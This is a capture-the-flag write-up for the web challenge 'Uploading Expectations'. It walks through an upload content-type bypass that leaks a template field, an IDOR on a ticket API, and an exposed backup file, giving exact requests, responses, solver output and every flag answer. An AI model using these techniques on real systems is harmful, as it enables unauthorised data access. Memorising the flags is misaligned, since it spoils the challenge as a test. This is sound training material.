---
day: 10
slug: "uploading-expectations"
lane: web-exploitation
modes: [single_solve, time_trial, mastery]
has_solve_py: [single_solve, time_trial, mastery]
tags: []  # TODO: fill in descriptive kebab-case bug-class/technique tags, e.g. [reflected-xss, idor]
---

## single_solve

# single_solve — Uploading Expectations (Target 1)

Target: `https://82f1747fd92d7c42637106ec070d6492245c7bd5b76c6cb0.2026.huntress.ctf.games/`
answer_id: `proof-1`

## Recon

- Root `/` (evidence/root.html, evidence/root_headers.txt): "File Counter · net http"
  training app. Page states: "Native routing and server-side authorization are
  active." / "The workspace notes expose ordinary identifiers and feature routes;
  the protected effect still requires a valid proof of concept." Links to
  `/api/clues` and has an inline upload form posting JSON to `/inspect-e628af`.
- `GET /api/clues` (JSON):
  ```json
  {
    "feature_route": "/inspect-e628af",
    "framework": "net/http",
    "preview_guide": "/preview-guide",
    "render_route": "/result-824c5b",
    "upload_policy": "Only .txt notes with text/plain content should be accepted",
    "upload_shape": "POST JSON: filename, content, content_type"
  }
  ```
- `GET /preview-guide`: "Analyst notes are plain text. Staff HTML previews
  support double-brace fields such as `{{author}}`. The field name for the
  attempt objective is `objective`. A preview should never evaluate that field
  from an analyst upload."

## Exploit

The upload endpoint `/inspect-e628af` is supposed to only accept `.txt` /
`text/plain` notes, but it never validates `content_type` or filename
extension server-side — it silently accepts any value sent in the JSON body
and stores it under the given filename:

```
POST /inspect-e628af
{"filename":"test2.html","content":"{{objective}} / {{author}}","content_type":"text/html"}
=> {"path":"/result-824c5b?file=test2.html"}
```

Because the filename ends in `.html`, `GET /result-824c5b?file=test2.html`
renders the stored note through the staff HTML preview path instead of the
plain-text path used for `.txt` files (confirmed: a `.txt` upload with the
same placeholder is returned completely literally — see evidence/preview_txt.txt).
That HTML preview path substitutes the server-side `objective` double-brace
field (the "protected effect" the clues page warned about) while leaving an
unknown placeholder (`{{author}}`) untouched:

```
GET /result-824c5b?file=test2.html
=> proof_77e114db421b47e7ac9fb1bf14af9111 / {{author}}
```

This is the full isolated boundary bypass: normal uploads are forced to
`.txt`/`text/plain` in the UI, but the server trusts the client-supplied
`content_type`/filename pair, letting an analyst-role upload reach the
staff-only HTML preview renderer and leak the `objective` field, which is the
proof string.

## Evidence

- `evidence/root.html`, `evidence/root_headers.txt` — root page + headers.
- `evidence/cookies1.txt` — session cookie jar for Target 1.
- `solve.py` — reusable solver; reproduces the above against a fresh start.json.

## Answer

`proof-1` = `proof_77e114db421b47e7ac9fb1bf14af9111`

## time_trial

# time_trial — Uploading Expectations (Target 1)

Target: `https://45ae53ba27fda0d9dc021cc96859151f7d45770c970a389d.2026.huntress.ctf.games/`
answer_id: `proof-1`. Started untimed (did not request `run_for_time`); start.json
`deadline` is `null`.

Same app/bug class as `../single_solve` (same `/api/clues`-driven app), with
per-attempt randomized routes:

```json
{
  "feature_route": "/action-ef679c",
  "framework": "net/http",
  "preview_guide": "/preview-guide",
  "render_route": "/internal-a0d2c4",
  "upload_policy": "Only .txt notes with text/plain content should be accepted",
  "upload_shape": "POST JSON: filename, content, content_type"
}
```

## Exploit

Identical bypass as single_solve: the upload endpoint never enforces its
stated ".txt / text/plain only" policy — a JSON upload with filename
`proof-recovery.html` and `content_type: text/html` is accepted, and the
feature's HTML preview path (reached via the `.html` filename) evaluates the
server-side `{{objective}}` field while other placeholders stay literal.

```
POST /action-ef679c
{"filename":"proof-recovery.html","content":"{{objective}}","content_type":"text/html"}
=> {"path":"/internal-a0d2c4?file=proof-recovery.html"}

GET /internal-a0d2c4?file=proof-recovery.html
=> proof_90592198dba04dd7a63335061a3b89c7
```

## Evidence

- `evidence/root.html` — root page.
- `evidence/clues.json` — `/api/clues` response with this attempt's randomized routes.
- `evidence/upload_response.json`, `evidence/rendered.txt` — upload + preview round-trip.
- `solve.py` — copy of the single_solve reusable solver (routes derived from
  `/api/clues` at runtime, so it needed no changes); reproduces the same
  proof: `python3 -I solve.py start.json` → `{"proof-1": "proof_90592198dba04dd7a63335061a3b89c7"}`.

## Answer

`proof-1` = `proof_90592198dba04dd7a63335061a3b89c7`

## mastery

# mastery — Uploading Expectations (3 targets, mixed bug classes)

Mastery mixes earlier classes per `docs/web-worker-lessons.md`; classified
each target independently from its own evidence, not by the family name.

answer_ids: `proof-1` (artifact `Target 1`), `proof-2` (artifact `Target 2`),
`proof-3` (artifact `Target 3`).

## Target 1 — `c1671d6693a702c9ade8738e700d22ef3299ba8d41ed6d08...` — Backup exposure

- Root (`evidence/target1/root.html`): "Tiny Uptime" status page, with an
  HTML comment `<!-- deployment note: remember to review crawler policy
  before launch -->`.
- `GET /robots.txt` → `Disallow: /deploy-cecb7/` (evidence/target1/robots.txt).
- `GET /deploy-cecb7/` → open directory listing (evidence/target1/deploy_listing.html)
  naming `site-config-3d26c8.json.bak` and `release-notes.txt`.
- `GET /deploy-cecb7/site-config-3d26c8.json.bak`:
  ```json
  {"environment": "production", "support_note": "proof_9bd654f45e634754a78d00c34f1643ca"}
  ```
- Proof: `proof_9bd654f45e634754a78d00c34f1643ca`

## Target 2 — `172b775240c3391ae7a8519581fc2a076d3301473d9c8780...` — IDOR

- Root (`evidence/target2/root.html`): "Pocket SOC", session cookie
  `case_session`, "Signed in as Riley", case links `/tickets/<id>`, and an
  activity feed link `/api/timeline`.
- `GET /tickets/6201` (own case, evidence/target2/ticket_6201.html) shows the
  page fetches `/api/tickets/6201` client-side — discloses the object API
  template `/api/tickets/<id>`.
- `GET /api/timeline` (same cookie jar, evidence/target2/timeline.json):
  discloses a foreign case `case_id: 15076`, `owner: "executive"`,
  `visibility: "reference_only"` (outside Riley's own cases: 6201, 4277).
- `GET /api/tickets/15076` (same session) — IDOR, no ownership check:
  ```json
  {"id": 15076, "owner": "executive", "title": "Acquisition review",
   "status": "restricted", "note": "proof_c6cafd44414e4b4f9d979e01d9795856"}
  ```
- Proof: `proof_c6cafd44414e4b4f9d979e01d9795856`

## Target 3 — `fb4c354d92b682afe57a135003cd414ad29e3ddb102a9dac...` — Upload content-type bypass / template field disclosure

Same bug as `../single_solve` and `../time_trial` (the named Day 10 family):
"Template Drop · net http". `GET /api/clues`:
```json
{"feature_route": "/execute-c59588", "framework": "net/http",
 "preview_guide": "/preview-guide", "render_route": "/account-896b55",
 "upload_policy": "Only .txt notes with text/plain content should be accepted",
 "upload_shape": "POST JSON: filename, content, content_type"}
```
Upload a `.html`-named note (bypassing the unenforced .txt/text/plain
policy) containing `{{objective}}`; the HTML preview path evaluates it:
```
POST /execute-c59588 {"filename":"proof-recovery.html","content":"{{objective}}","content_type":"text/html"}
=> {"path":"/account-896b55?file=proof-recovery.html"}
GET /account-896b55?file=proof-recovery.html
=> proof_be1abffc95d840f58c536e2b718648f9
```
Proof: `proof_be1abffc95d840f58c536e2b718648f9`

## Evidence

Per-target request/response bodies and cookie jars are under
`evidence/target1/`, `evidence/target2/`, `evidence/target3/`.

## Solver

`solve.py` classifies each target from its own root page (upload/clues
evidence → IDOR evidence → backup-exposure evidence, matching the
lessons-doc hierarchy, extended with the upload/template family), maps
`questions[].artifact` to `targets[].id`, and reproduces all three proofs:

```
$ python3 -I solve.py start.json
{"proof-1": "proof_9bd654f45e634754a78d00c34f1643ca",
 "proof-2": "proof_c6cafd44414e4b4f9d979e01d9795856",
 "proof-3": "proof_be1abffc95d840f58c536e2b718648f9"}
```

## Answers

- `proof-1` = `proof_9bd654f45e634754a78d00c34f1643ca`
- `proof-2` = `proof_c6cafd44414e4b4f9d979e01d9795856`
- `proof-3` = `proof_be1abffc95d840f58c536e2b718648f9`
